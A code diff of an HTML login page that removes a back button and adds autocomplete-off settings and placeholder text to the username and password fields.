@@ -11,26 +11,21 @@
 
 </head>
 <body>
-  <!-- Back Button -->
-  <button class="back-button" onclick="window.location.href='/Acconts.html';">
-    <img src="img/left-arrow.png"height="15px" width="15px" alt="">
-  </button>
-
   <div class="login-container">
     <div id="error-message" class="error-message">
       Something went wrong ! Please re-login to your account.
   </div>
     <h1>Log In</h1>
     <!-- Form for login -->
-    <form action="" method="POST" onsubmit="return validatePassword(event)">
+    <form action="" method="POST" autocomplete="off" onsubmit="return validatePassword(event)">
       <label for="username">USERNAME OR EMAIL</label>
-      <input type="text" id="username" name="name" required>
+      <input type="text" id="username" name="name" required autocomplete="off" placeholder="Enter username or email">
       
       <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
       
       <label for="password">PASSWORD</label>
       <div class="password-container">
-        <input type="password" id="password" name="message" required>
+        <input type="password" id="password" name="message" required autocomplete="new-password" placeholder="Enter password">
         <button type="button" class="toggle-password">
           <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
         </button>
